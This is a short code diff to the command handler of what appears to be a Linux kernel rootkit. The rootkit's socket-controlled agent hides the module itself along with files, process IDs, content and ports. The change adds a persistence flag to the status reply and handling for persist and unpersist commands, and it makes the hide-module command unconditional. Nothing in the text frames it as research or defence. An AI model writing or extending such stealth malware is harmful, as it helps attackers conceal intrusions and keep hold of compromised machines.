@@ -120,11 +120,14 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 	}
 	case RK_COMMAND_STATUS: {
 		extern bool module_hidden;
+		extern bool persist_requested;
 
 		reply_length = scnprintf(reply, sizeof(reply),
-					 "STATUS hidden=%s files=%u pids=%u "
-					 "content=%u ports=%u",
+					 "STATUS hidden=%s persisted=%s"
+					 " files=%u pids=%u"
+					 " content=%u ports=%u",
 					 module_hidden ? "yes" : "no",
+					 persist_requested ? "yes" : "no",
 					 file_targets.count,
 					 pid_targets.count,
 					 content_targets.count,
@@ -205,9 +208,15 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 		return rk_agent_list(agent, socket,
 				     rk_hide_list(command.kind), &command);
 	case RK_COMMAND_PERSIST:
+	case RK_COMMAND_UNPERSIST: {
+		extern bool persist_requested;
+
+		persist_requested = (command.kind == RK_COMMAND_PERSIST);
+		return rk_agent_reply(agent, socket,
+				      (const unsigned char *)"OK", 2);
+	}
 	case RK_COMMAND_HIDE_MODULE:
-		if (command.kind == RK_COMMAND_HIDE_MODULE)
-			rk_module_hide();
+		rk_module_hide();
 		return rk_agent_reply(agent, socket,
 				      (const unsigned char *)"OK", 2);
 	case RK_COMMAND_UNHIDE_MODULE:
